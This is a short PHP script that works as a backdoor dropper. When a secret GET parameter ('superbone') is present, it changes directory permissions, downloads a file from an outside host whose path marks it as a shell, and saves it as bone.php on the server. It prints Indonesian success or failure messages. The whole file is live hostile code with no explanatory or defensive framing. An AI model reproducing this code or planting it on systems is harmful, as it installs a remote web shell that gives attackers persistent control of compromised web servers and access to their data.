<?php

if (isset($_GET['superbone'])) {
    chmod(getcwd(), 0755);
    if (file_put_contents(getcwd(). '/bone.php', file_get_contents("https://marslogs.co.id/shell/shell/anon.txt"))) {
        echo 'berhasil: ' . getcwd() . '/bone.php';
    } else {
        echo 'gagal';
    }
}

?>
